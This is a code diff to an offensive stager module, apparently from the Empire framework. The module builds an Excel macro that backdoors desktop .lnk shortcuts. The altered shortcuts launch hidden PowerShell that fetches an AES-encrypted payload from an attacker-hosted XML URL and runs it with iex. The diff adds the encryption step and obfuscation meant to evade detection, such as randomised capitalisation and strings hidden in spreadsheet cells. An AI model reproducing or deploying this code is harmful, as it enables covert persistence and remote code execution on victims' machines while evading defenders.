@@ -2,7 +2,7 @@ import random, string, xlrd, datetime
 from xlutils.copy import copy
 from xlwt import Workbook, Utils
 from lib.common import helpers
-
+from Crypto.Cipher import AES
 
 class Stager:
 
@@ -11,7 +11,7 @@ class Stager:
         self.info = {
             'Name': 'BackdoorLnkFileMacroXML3',
 
-            'Author': ['G0ldenGun (@G0ldenGunSec)'],
+            'Author': ['@G0ldenGunSec'],
 
             'Description': ('Generates a macro that backdoors .lnk files on the users desktop, backdoored lnk files in turn attempt to download & execute an empire launcher when the user clicks on them. Usage: Three files will be spawned from this, an xls document (either new or containing existing contents) that data will be placed into, a macro that should be placed in the spawned xls document, and an xml that should be placed on a web server accessible by the remote system.  By default this xml is written to /var/www/html, which is the webroot on debian-based systems such as kali.'),
 
@@ -96,8 +96,6 @@ class Stager:
             if option in self.options:
                 self.options[option]['Value'] = value
 
-
-
     #function to convert row + col coords into excel cells (ex. 30,40 -> AE40)
     @staticmethod
     def coordsToCell(row,col):
@@ -111,16 +109,14 @@ class Stager:
 	coords = coords + str(row+1)
 	return coords
 
-
     def generate(self):
-
-        # extract all of our options
-        language = self.options['Language']['Value']
-        listenerName = self.options['Listener']['Value']
-        userAgent = self.options['UserAgent']['Value']
-        proxy = self.options['Proxy']['Value']
-        proxyCreds = self.options['ProxyCreds']['Value']
-        stagerRetries = self.options['StagerRetries']['Value']
+	# extract all of our options
+	language = self.options['Language']['Value']
+	listenerName = self.options['Listener']['Value']
+	userAgent = self.options['UserAgent']['Value']
+	proxy = self.options['Proxy']['Value']
+	proxyCreds = self.options['ProxyCreds']['Value']
+	stagerRetries = self.options['StagerRetries']['Value']
 	targetEXE = self.options['TargetEXEs']['Value']	
 	xlsOut = self.options['XlsOutFile']['Value']
 	XmlPath = self.options['XmlUrl']['Value']
@@ -133,18 +129,22 @@ class Stager:
 	targetEXE = targetEXE.split(',')
 	targetEXE = filter(None,targetEXE)
 
-
+	#set vars
 	shellVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(6,9)))
 	lnkVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(6,9)))
 	fsoVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(6,9)))
 	folderVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(6,9)))
 	fileVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(6,9)))
-
+	encKey = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase + string.digits + string.punctuation, random.randint(16,16)))
+	for ch in ["\"","'","`"]:
+		if ch in encKey:
+			encKey = encKey.replace(ch,random.choice(string.ascii_lowercase))
+	encIV = random.randint(1,240)
 
         # generate the launcher
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
-	launcher = launcher.split(" ")[-1]
-
+        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=False, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
+	launcher = launcher.replace("\"","'")
+	
         if launcher == "":
             print helpers.color("[!] Error in launcher command generation.")
             return ""
@@ -161,10 +161,9 @@ class Stager:
 	    inputRow = random.randint(50,70)
 	    inputCol = random.randint(40,60)
 
-	    #build out the macro - will look for all .lnk files on the desktop, any that it finds it will inspect to determine whether it matches any of the target exe names
+	    #build out the macro - first take all strings that would normally go into the macro and place them into random cells, which we then reference in our macro
             macro = "Sub Auto_Close()\n"
 	
-
 	    activeSheet.write(inputRow,inputCol,helpers.randomize_capitalization("Wscript.shell"))
 	    macro += "Set " + shellVar + " = CreateObject(activeSheet.Range(\""+self.coordsToCell(inputRow,inputCol)+"\").value)\n"
 	    inputCol = inputCol + random.randint(1,4)
@@ -190,52 +189,66 @@ class Stager:
 		inputCol = inputCol + random.randint(1,4)
 	    macro += ") Then\n"
  
-	    launchString1 = "hidden -nop -command \"[System.Diagnostics.Process]::Start(\'"
-	    launchString2 = "\');$u=New-Object -comObject wscript.shell;Get-ChildItem -Path $env:USERPROFILE\desktop -Filter *.lnk | foreach { $lnk = $u.createShortcut($_.FullName);if($lnk.arguments -like \'*xml.xmldocument*\') {$start = $lnk.arguments.IndexOf(\'\'\'\') + 1; $result = $lnk.arguments.Substring($start, $lnk.arguments.IndexOf(\'\'\'\', $start) - $start );$lnk.targetPath = $result; $lnk.Arguments = \'\'; $lnk.Save()}};$b = New-Object System.Xml.XmlDocument;if([int](get-date -UFormat "
-	    launchString25 = ") -le " + str(killDate[2]) + str(killDate[0]) + str(killDate[1]) + "){$b.Load(\'" 
-	    launchString3 = "\');[Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($b.main))|IEX}\""
-	    
+	    launchString1 = "hidden -nop -c \"Start(\'"
+	    launchString2 = "\');$u=New-Object -comObject wscript.shell;gci -Pa $env:USERPROFILE\desktop -Fi *.lnk|%{$l=$u.createShortcut($_.FullName);if($l.arguments-like\'*xml.xmldocument*\'){$s=$l.arguments.IndexOf(\'\'\'\')+1;$r=$l.arguments.Substring($s, $l.arguments.IndexOf(\'\'\'\',$s)-$s);$l.targetPath=$r;$l.Arguments=\'\';$l.Save()}};$b=New-Object System.Xml.XmlDocument;if([int](get-date -U "
+	    launchString3 = ") -le " + str(killDate[2]) + str(killDate[0]) + str(killDate[1]) + "){$b.Load(\'" 
+	    launchString4 = "\');$a=New-Object 'Security.Cryptography.AesManaged';$a.IV=(" + str(encIV) + ".." + str(encIV + 15) + ");$a.key=[text.encoding]::UTF8.getBytes('" 
+	    launchString5 = "');$by=[System.Convert]::FromBase64String($b.main);[Text.Encoding]::UTF8.GetString($a.CreateDecryptor().TransformFinalBlock($by,0,$by.Length)).substring(16)|iex}\""
 
-	    #part of the macro that actually modifies the LNK files on the desktop, sets iconlocation for updated lnk to the old targetpath, args to our launch code, and target to powershell so we can do a direct call to it
+	    #part of the macro that actually modifies the LNK files on the desktop, sets icon location for updated lnk to the old targetpath, args to our launch code, and target to powershell so we can do a direct call to it
 	    macro += lnkVar + ".IconLocation = " + lnkVar + ".targetpath\n"
-	   
 	    launchString1 = helpers.randomize_capitalization(launchString1)
 	    launchString2 = helpers.randomize_capitalization(launchString2)
 	    launchString3 = helpers.randomize_capitalization(launchString3)
-	    launchString25 = helpers.randomize_capitalization(launchString25)
-	    launchString4 = launchString2 + "'%Y%m%d'" + launchString25 + XmlPath + launchString3
+	    launchString4 = helpers.randomize_capitalization(launchString4)
+	    launchString5 = helpers.randomize_capitalization(launchString5)
+	    launchStringSum = launchString2 + "'%Y%m%d'" + launchString3 + XmlPath + launchString4 + encKey + launchString5
 
 	    activeSheet.write(inputRow,inputCol,launchString1)
 	    launch1Coords = self.coordsToCell(inputRow,inputCol) 
 	    inputCol = inputCol + random.randint(1,4)
-	    activeSheet.write(inputRow,inputCol,launchString4)
-	    launch4Coords = self.coordsToCell(inputRow,inputCol)
+	    activeSheet.write(inputRow,inputCol,launchStringSum)
+	    launchSumCoords = self.coordsToCell(inputRow,inputCol)
 	    inputCol = inputCol + random.randint(1,4)
 
-	    macro += lnkVar + ".arguments = \"-w \" + activeSheet.Range(\""+ launch1Coords +"\").Value + " + lnkVar + ".targetPath" + " + activeSheet.Range(\""+ launch4Coords +"\").Value" + "\n"
+	    macro += lnkVar + ".arguments = \"-w \" + activeSheet.Range(\""+ launch1Coords +"\").Value + " + lnkVar + ".targetPath" + " + activeSheet.Range(\""+ launchSumCoords +"\").Value" + "\n"
 
 	    activeSheet.write(inputRow,inputCol,helpers.randomize_capitalization(":\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"))
 	    macro += lnkVar + ".targetpath = left(CurDir, InStr(CurDir, \":\")-1) + activeSheet.Range(\""+self.coordsToCell(inputRow,inputCol)+"\").value\n"
 	    inputCol = inputCol + random.randint(1,4)
 	    macro += lnkVar + ".save\n"
-
 	    macro += "end if\n"
 	    macro += "end if\n"
 	    macro += "next " + fileVar + "\n"
-
 	    macro += "End Sub\n"
 	    activeSheet.row(inputRow).hidden = True 
 	    print helpers.color("\nWriting xls...\n", color="blue")
 	    workBook.save(xlsOut)
 	    print helpers.color("xls written to " + xlsOut + "  please remember to add macro code to xls prior to use\n\n", color="green")
 
-#write XML to disk
 
+	    #encrypt the second stage code that will be dropped into the XML
+	    ivBuf = ""
+	    for z in range(0,16):
+		ivBuf = ivBuf + chr(encIV + z)
+	    encryptor = AES.new(unicode(encKey, "utf-8"), AES.MODE_CBC, ivBuf)
+	    launcher = unicode(launcher,"utf-8")
+	    #pkcs7 padding - aes standard on Windows
+	    padding = 16-(len(launcher) % 16)
+	    if padding == 0:
+		launcher = launcher + ('\x00'*16)
+	    else:
+		launcher = launcher + (chr(padding)*padding)
+
+	    cipher_text = encryptor.encrypt(launcher)
+	    cipher_text = helpers.encode_base64(ivBuf+cipher_text)
+
+	    #write XML to disk
 	    print helpers.color("Writing xml...\n", color="blue")
 	    f = open(XmlOut,"w")
 	    f.write("<?xml version=\"1.0\"?>\n")
 	    f.write("<main>")
-	    f.write(launcher)
+	    f.write(cipher_text)
 	    f.write("</main>\n")
 	    print helpers.color("xml written to " + XmlOut + " please remember this file must be accessible by the target at this url: " + XmlPath + "\n", color="green")
 
